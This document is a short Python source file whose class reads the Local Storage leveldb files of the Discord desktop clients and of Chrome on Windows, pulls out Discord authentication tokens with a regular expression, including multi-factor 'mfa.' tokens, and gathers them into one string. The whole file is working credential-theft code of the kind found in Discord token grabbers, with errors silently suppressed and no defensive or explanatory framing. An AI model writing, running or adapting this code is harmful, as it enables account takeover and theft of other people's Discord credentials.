import os
import re

class Discord():
	def __init__(self):
		self.tokens = []
		self.saved = ""
		self.regex = r"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}"
		self.discord()
		self.chrome()
		self.neatify()

	def discord(self):
		discordPaths = [os.getenv('APPDATA') + '\\Discord\\Local Storage\\leveldb',
		os.getenv('APPDATA') + '\\discordcanary\\Local Storage\\leveldb',
		os.getenv('APPDATA') + '\\discordptb\\Local Storage\\leveldb']

		for location in discordPaths:
			try:
				if os.path.exists(location):
					for file in os.listdir(location):
						with open(f"{location}\\{file}", errors='ignore') as _data:
							regex = re.findall(self.regex, _data.read())
							if regex:
								for token in regex:
									self.tokens.append(token)
			except:
				pass

	def chrome(self):
		chromie = os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb'
		try:
			if os.path.exists(chromie):
				for file in os.listdir(chromie):
					with open(f"{chromie}\\{file}", errors='ignore') as _data:
						regex = re.findall(self.regex, _data.read())
						if regex:
							for token in regex:
								self.tokens.append(token)
		except Exception as e:
			pass

	def neatify(self):
		for token in self.tokens:
			self.saved += "%s\n" % token